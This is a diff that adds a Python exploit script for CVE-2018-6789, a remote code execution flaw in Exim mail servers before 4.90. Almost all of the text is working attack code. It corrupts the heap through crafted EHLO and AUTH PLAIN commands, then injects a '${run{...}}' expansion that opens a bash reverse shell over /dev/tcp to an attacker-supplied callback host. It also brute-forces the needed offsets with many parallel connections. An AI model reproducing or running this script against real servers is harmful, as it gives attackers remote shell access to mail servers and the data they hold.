@@ -1,0 +1,605 @@
+# Exploit Title: exim 4.90 - Remote Code Execution
+# Date: 2018-10-24
+# Exploit Author: hackk.gr
+# Vendor Homepage: exim.org
+# Version: exim < 4.90
+# Tested on: debian exim 4.89, ubuntu exim 4.86_2
+# CVE : CVE-2018-6789
+
+#!/usr/bin/python
+#debian exim 4.89
+#ubuntu exim 4.86_2
+import time
+import socket
+import struct
+import os
+import os.path
+import sys
+import ssl
+import random
+from multiprocessing import Process, Queue
+
+s = None
+f = None
+test = True
+rcpt_index_start = 0x120
+bufsize = 8200
+
+def connect(host, port):
+   global s
+   global f
+   s = socket.create_connection((host,port))
+   f = s.makefile("rw", bufsize=0)
+
+def p(v):
+   return struct.pack("<Q", v)
+
+def readuntil(delim='\n'):
+   data = ''
+   auth_plain_available = False
+   while True:
+    
+    l = f.readline()
+    if l == "":
+      return ""
+      
+    if l.find("PLAIN") > -1:
+      auth_plain_available = True    
+      
+    if test:
+      if len(l) > 70:
+       sys.stdout.write(l[:70] + " ...\n")
+       sys.stdout.flush()
+      else:
+       print l.strip("\r").strip("\n")
+      
+    data = data + l
+    if data.find(delim) > -1:
+     return data
+    if l == "\n" or l == "":
+     return ""
+   return data
+
+def write(data):
+   f.write(data + "\n")
+def ehlo(v):
+   write("EHLO " + v)
+   return readuntil('HELP')
+def unrec(v):
+   write(v)
+   readuntil('command')
+def auth_plain(v):
+   encode = v.encode('base64').replace('\n','').replace('=','')
+   write("AUTH PLAIN " + encode)
+   l = f.readline()
+   if test:
+    if l.find("not advert") > -1 or l.find("not supported")> -1:
+     raise Exception("NO AUTH PLAIN CONFIG")
+    print l
+def auth_plain1(v):
+   encode = v.encode('base64').replace('\n','').replace('=','')
+   write("AUTH PLAIN " + encode)
+   l = f.readline()
+   if test:
+    if l.find("Incorrect") > -1:
+     raise Exception("WRONG DRIVER")
+    if l.find("not advert") > -1 or l.find("not supported")> -1:
+     raise Exception("NO AUTH PLAIN CONFIG")
+    print l
+def auth_plain2(v,value):
+   encode = v.encode('base64').replace('\n','').replace('=','')
+   value = chr(value).encode('base64').replace('\n','').replace('=','')
+   write("AUTH PLAIN " + encode[:-1] + value)
+   l = f.readline()
+   if test:
+    if l.find("Incorrect") > -1:
+     raise Exception("WRONG DRIVER")
+    if l.find("not advert") > -1 or l.find("not supported")> -1:
+     raise Exception("NO AUTH PLAIN CONFIG")
+    print l
+def one_byte_overwrite():
+   v = "C" * bufsize
+   encode = v.encode('base64').replace('\n','').replace('=','')
+   encode = encode[:-1] + "PE"
+   write("AUTH PLAIN " + encode)
+   l = f.readline()
+   if test:
+    if l.find("Incorrect") > -1:
+     raise Exception("WRONG DRIVER")
+    if l.find("not advert") > -1 or l.find("not supported")> -1:
+     raise Exception("NO AUTH PLAIN CONFIG")
+    print l
+
+lookup_table = {0x00: [0,3],
+0x01: [0,7],
+0x02: [0,11],
+0x03: [0,15],
+0x04: [0,19],
+0x05: [0,23],
+0x06: [0,27],
+0x07: [0,31],
+0x08: [0,35],
+0x09: [0,39],
+0x0a: [0,43],
+0x0b: [0,47],
+0x0c: [0,51],
+0x0d: [0,55],
+0x0e: [0,59],
+0x0f: [0,63],
+0x10: [0,67],
+0x11: [0,71],
+0x12: [0,75],
+0x13: [0,79],
+0x14: [0,83],
+0x15: [0,87],
+0x16: [0,91],
+0x17: [0,95],
+0x18: [0,99],
+0x19: [0,103],
+0x1a: [0,107],
+0x1b: [0,111],
+0x1c: [0,115],
+0x1d: [0,119],
+0x1e: [0,123],
+0x1f: [0,127],
+0x20: [0,131],
+0x21: [0,135],
+0x22: [0,139],
+0x23: [0,143],
+0x24: [0,147],
+0x25: [0,151],
+0x26: [0,155],
+0x27: [0,159],
+0x28: [0,163],
+0x29: [0,167],
+0x2a: [0,171],
+0x2b: [0,175],
+0x2c: [0,179],
+0x2d: [0,183],
+0x2e: [0,187],
+0x2f: [0,191],
+0x30: [0,195],
+0x31: [0,199],
+0x32: [0,203],
+0x33: [0,207],
+0x34: [0,211],
+0x35: [0,215],
+0x36: [0,219],
+0x37: [0,223],
+0x38: [0,227],
+0x39: [0,231],
+0x3a: [0,235],
+0x3b: [0,239],
+0x3c: [0,243],
+0x3d: [0,247],
+0x3e: [0,251],
+0x3f: [0,254],
+0x40: [64,3],
+0x41: [64,7],
+0x42: [64,11],
+0x43: [64,15],
+0x44: [64,19],
+0x45: [64,23],
+0x46: [64,27],
+0x47: [64,31],
+0x48: [64,35],
+0x49: [64,39],
+0x4a: [64,43],
+0x4b: [64,47],
+0x4c: [64,51],
+0x4d: [64,55],
+0x4e: [64,59],
+0x4f: [64,63],
+0x50: [64,67],
+0x51: [64,71],
+0x52: [64,75],
+0x53: [64,79],
+0x54: [64,83],
+0x55: [64,87],
+0x56: [64,91],
+0x57: [64,95],
+0x58: [64,99],
+0x59: [64,103],
+0x5a: [64,107],
+0x5b: [64,111],
+0x5c: [64,115],
+0x5d: [64,119],
+0x5e: [64,123],
+0x5f: [64,127],
+0x60: [64,131],
+0x61: [64,135],
+0x62: [64,139],
+0x63: [64,143],
+0x64: [64,147],
+0x65: [64,151],
+0x66: [64,155],
+0x67: [64,159],
+0x68: [64,163],
+0x69: [64,167],
+0x6a: [64,171],
+0x6b: [64,175],
+0x6c: [64,179],
+0x6d: [64,183],
+0x6e: [64,187],
+0x6f: [64,191],
+0x70: [64,195],
+0x71: [64,199],
+0x72: [64,203],
+0x73: [64,207],
+0x74: [64,211],
+0x75: [64,215],
+0x76: [64,219],
+0x77: [64,223],
+0x78: [64,227],
+0x79: [64,231],
+0x7a: [64,235],
+0x7b: [64,239],
+0x7c: [64,243],
+0x7d: [64,247],
+0x7e: [64,251],
+0x7f: [64,254],
+0x80: [128,3],
+0x81: [128,7],
+0x82: [128,11],
+0x83: [128,15],
+0x84: [128,19],
+0x85: [128,23],
+0x86: [128,27],
+0x87: [128,31],
+0x88: [128,35],
+0x89: [128,39],
+0x8a: [128,43],
+0x8b: [128,47],
+0x8c: [128,51],
+0x8d: [128,55],
+0x8e: [128,59],
+0x8f: [128,63],
+0x90: [128,67],
+0x91: [128,71],
+0x92: [128,75],
+0x93: [128,79],
+0x94: [128,83],
+0x95: [128,87],
+0x96: [128,91],
+0x97: [128,95],
+0x98: [128,99],
+0x99: [128,103],
+0x9a: [128,107],
+0x9b: [128,111],
+0x9c: [128,115],
+0x9d: [128,119],
+0x9e: [128,123],
+0x9f: [128,127],
+0xa0: [128,131],
+0xa1: [128,135],
+0xa2: [128,139],
+0xa3: [128,143],
+0xa4: [128,147],
+0xa5: [128,151],
+0xa6: [128,155],
+0xa7: [128,159],
+0xa8: [128,163],
+0xa9: [128,167],
+0xaa: [128,171],
+0xab: [128,175],
+0xac: [128,179],
+0xad: [128,183],
+0xae: [128,187],
+0xaf: [128,191],
+0xb0: [128,195],
+0xb1: [128,199],
+0xb2: [128,203],
+0xb3: [128,207],
+0xb4: [128,211],
+0xb5: [128,215],
+0xb6: [128,219],
+0xb7: [128,223],
+0xb8: [128,227],
+0xb9: [128,231],
+0xba: [128,235],
+0xbb: [128,239],
+0xbc: [128,243],
+0xbd: [128,247],
+0xbe: [128,251],
+0xbf: [128,254],
+0xc0: [192,3],
+0xc1: [192,7],
+0xc2: [192,11],
+0xc3: [192,15],
+0xc4: [192,19],
+0xc5: [192,23],
+0xc6: [192,27],
+0xc7: [192,31],
+0xc8: [192,35],
+0xc9: [192,39],
+0xca: [192,43],
+0xcb: [192,47],
+0xcc: [192,51],
+0xcd: [192,55],
+0xce: [192,59],
+0xcf: [192,63],
+0xd0: [192,67],
+0xd1: [192,71],
+0xd2: [192,75],
+0xd3: [192,79],
+0xd4: [192,83],
+0xd5: [192,87],
+0xd6: [192,91],
+0xd7: [192,95],
+0xd8: [192,99],
+0xd9: [192,103],
+0xda: [192,107],
+0xdb: [192,111],
+0xdc: [192,115],
+0xdd: [192,119],
+0xde: [192,123],
+0xdf: [192,127],
+0xe0: [192,131],
+0xe1: [192,135],
+0xe2: [192,139],
+0xe3: [192,143],
+0xe4: [192,147],
+0xe5: [192,151],
+0xe6: [192,155],
+0xe7: [192,159],
+0xe8: [192,163],
+0xe9: [192,167],
+0xea: [192,171],
+0xeb: [192,175],
+0xec: [192,179],
+0xed: [192,183],
+0xee: [192,187],
+0xef: [192,191],
+0xf0: [192,195],
+0xf1: [192,199],
+0xf2: [192,203],
+0xf3: [192,207],
+0xf4: [192,211],
+0xf5: [192,215],
+0xf6: [192,219],
+0xf7: [192,223],
+0xf8: [192,227],
+0xf9: [192,231],
+0xfa: [192,235],
+0xfb: [192,239],
+0xfc: [192,243],
+0xfd: [192,247],
+0xfe: [192,251],
+0xff: [192,254],
+} 
+
+def exploit(b1, b2, b3, rcpt_index, target, cb, cbport):
+   global s
+   global f
+
+   #if c % 0x50 == 0:
+   # print " byte1=0x%02x byte2=0x%02x byte3=0x%02x rcpt_index=0x%02x" % (b1, b2, b3, rcpt_index)
+   
+   try:
+    connect(target, 25)
+   except:
+    raise Exception("CONNECTION ERROR")
+   
+   banner = f.readline()
+   if test:
+    print banner.strip("\r").strip("\n")
+
+   ehlo("A" * 8000)
+   
+   ehlo("B" * 16)
+   
+   unrec("\xff" * 2000)
+   ehlo("D" * bufsize)
+   one_byte_overwrite()
+    
+   fake_header  = p(0) 
+   fake_header += p(0x1f51)
+   res = auth_plain1("E" * 176 + fake_header + "E" * (bufsize-176-len(fake_header)))
+   
+   res = ehlo("F" * 16)
+   if res == "":
+   	raise Exception("CRASHED")
+   
+   unrec("\xff" * 2000)
+   unrec("\xff" * 2000)
+
+   fake_header  = p(0x4110)
+   fake_header += p(0x1f50)
+   auth_plain("G" * 176 + fake_header + "G" * (bufsize-176-len(fake_header)))
+   
+   auth_plain2('A'* (bufsize) + p(0x2021) + chr(b1) + chr(b2) + chr(lookup_table[b3][0]), lookup_table[b3][1])
+   res = ehlo("I" * 16)
+      
+   if res == "":
+    s.close()
+    f.close()
+    raise Exception("EHLO(I)")
+
+   acl_smtp_rcpt_offset = rcpt_index
+   local_host = cb
+   local_port = cbport
+   cmd = "/usr/bin/setsid /bin/bash -c \"/bin/bash --rcfile <(echo 'echo " + "0x%02x " % b1 + "0x%02x " % b2 + "0x%02x " % b3 + "0x%04x " % rcpt_index + "') -i >& /dev/tcp/" + local_host + "/" + str(local_port) + " 0>&1\""
+   cmd_expansion_string = "${run{" + cmd + "}}\0"
+
+   auth_plain("J" * acl_smtp_rcpt_offset + cmd_expansion_string + "\x00")# * (bufsize - acl_smtp_rcpt_offset - len(cmd_expansion_string))) 
+
+   write("MAIL FROM:<postmaster@localhost>")
+
+   res = f.readline()
+
+   if res != "":
+    if test:
+     raise Exception("NO TARGET")
+    raise Exception("OFFSET")
+
+   raise Exception("BYTE")
+ 
+   write("RCPT TO:<postmaster@localhost>")   
+   readuntil("Accepted")
+    
+   write("RCPT TO:<postmaster@localhost>")
+   if f.readline() == "":
+    s.close()
+    f.close()
+    raise Exception("RCPT TO")
+
+def checkvuln(host):
+ try:
+  exploit(0xff, 0xff, 0xff, rcpt_index_start, host, "127.0.0.1", "1337")
+ except Exception as e:
+  print e
+  if str(e) == "EHLO(I)":
+   return True
+ return False
+
+def _exploit(b1, b2, b3, rcpt_index, target, cb, cbport, q):
+ if b1 > 0xff or b2 > 0xff or b3 > 0xff:
+  q.put([b1,b2,b3,"VALUE"])
+  return
+ try:
+  exploit(b1, b2, b3, rcpt_index, target, cb, cbport)
+ except Exception as e:
+  e = str(e)
+  if e == "[Errno 104] Connection reset by peer" or e.find("EOF occurred") > -1:
+    e = "BYTE"
+  q.put([b1,b2,b3,e])
+  
+if __name__ == '__main__':
+ if len(sys.argv) < 4:
+  print "%s <cb> <cbport> <target>" % sys.argv[0]
+  sys.exit(1)
+  
+ target = sys.argv[3]
+ cb = sys.argv[1]
+ cbport = sys.argv[2]
+
+ if len(sys.argv) == 8:
+  print "reuse fixed offsets"
+  b1 = int(sys.argv[4], 16)
+  b2 = int(sys.argv[5], 16)
+  b3 = int(sys.argv[6], 16)
+  rcpt_index = int(sys.argv[7], 16)
+
+  try:
+    exploit(b1, b2, b3, rcpt_index, target, cb, cbport)
+  except Exception as e:
+    print e
+  sys.exit(1)
+
+ print "check vuln"
+ if not checkvuln(target):
+  print "false"
+  sys.exit(1)
+
+ print "true"
+ test=False
+
+ allbytes = [offset for offset in xrange(0, 0x110)]
+ allbytes_10 = [offset for offset in xrange(0x10, 0x110, 0x10)]
+ b3_survived = []
+ 
+ b3_survived_stop = False
+ tested = []
+ try:
+   q = Queue()
+   procs = []
+   print
+   print "Discover first byte in offset"
+   print
+   sys.stdout.write("Try Offsets %02x%02x%02x to %02x%02x%02x ..." % (0x00,0xff,0xff,0xff,0xff,0xff))
+   for b3 in allbytes:
+     if b3 % 0x10 == 0 and b3 <= 0xff:
+      sys.stdout.write("\rTry Offsets %02x%02x%02x to %02x%02x%02x ..." % (b3,0xff,0xff,0xff,0xff,0xff))
+     
+     b1 = 0x00
+     
+     for b2 in allbytes_10:
+      proc = Process(target=_exploit, args=(b1, b2, b3, rcpt_index_start, target, cb, cbport, q))
+      procs.append(proc)
+      proc.daemon = True
+      proc.start()
+     
+      to_break = False
+      if len(procs) == 16:
+       for i in xrange(0,16):
+         result = q.get()
+         if result[3] == "BYTE":
+           if [b3, b2] not in tested:
+            tested.append([b3, b2])
+            b3_survived.append(result[2])
+            sys.stdout.write("\nOffset %02x%02x%02x Survived ..." % (result[2],result[1],result[0]))
+           else:
+            to_break = True
+       
+       procs[:] = []
+       if to_break:
+        break
+   
+   print "\n"
+   print "Discover offsets for rcpt index brute force ..."
+   print
+   b1_survived = {}
+   for b3 in b3_survived:
+    for b2 in allbytes:
+     if b2 % 0x10 == 0 and b2 <= 0xff:
+      sys.stdout.write("\r\r\nTry Offsets %02x%02x%02x to %02x%02x%02x ... " % (b3,b2,0x00,b3,0xff,0xf0))
+     for b1 in allbytes_10:
+       proc = Process(target=_exploit, args=(b1, b2, b3, rcpt_index_start, target, cb, cbport, q))
+       procs.append(proc)
+       proc.daemon = True
+       proc.start()
+
+       if len(procs) == 16:
+        for i in xrange(0,16):
+          result = q.get()
+          if result[3] == "OFFSET":
+           if result[2] not in b1_survived:
+             b1_survived[result[2]] = []
+           b1_survived[result[2]].append(result)
+           sys.stdout.write("\n%02x%02x%02x Survived ..." % (result[2],result[1],result[0]))
+            
+        procs[:] = []
+   
+   iteration_list = [n for n in xrange(0x100,0x1000,0x10)]
+   iteration_list2 = [n for n in xrange(0x1000,0x3000,0x100)]
+
+   for n in iteration_list2:
+        iteration_list.append(n)
+
+   b1_survived_priority = []
+   b1_survived_additional = []
+
+   for key in sorted(b1_survived):
+    if len(b1_survived[key]) < 7:
+      b1_survived_priority.append(b1_survived[key])
+    else:
+      b1_survived_additional.append(b1_survived[key])
+
+   _b1_survived = []
+   for result in b1_survived_priority:
+    _b1_survived.append(result)
+   for result in b1_survived_additional:
+    _b1_survived.append(result)
+
+   print "\n"
+   print "Start rcpt index brute force ..."
+   print
+
+   for result in _b1_survived:
+    for s in result:
+     sys.stdout.write("\rTry Offset %02x%02x%02x with rcpt index from 0x100 to 0x3000 ..." % (s[2],s[1],s[0]))
+     for rcpt_index in iteration_list:
+       proc = Process(target=_exploit, args=(s[0], s[1], s[2], rcpt_index, target, cb, cbport, q))
+       procs.append(proc)
+       proc.daemon = True
+       proc.start()
+
+       if len(procs) == 16:
+        for i in xrange(0,16):
+         q.get()
+
+        procs[:] = []
+ except KeyboardInterrupt:
+  pass
+
+ print "done."
